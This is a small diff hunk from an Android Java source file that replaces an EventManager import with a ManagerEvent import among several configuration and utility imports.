@@ -10,7 +10,7 @@ import com.android.service.GeneralException;
 import com.android.service.Status;
 import com.android.service.conf.ConfEvent;
 import com.android.service.conf.Configuration;
-import com.android.service.event.EventManager;
+import com.android.service.manager.ManagerEvent;
 import com.android.service.util.Utils;
 
 import android.app.Instrumentation;
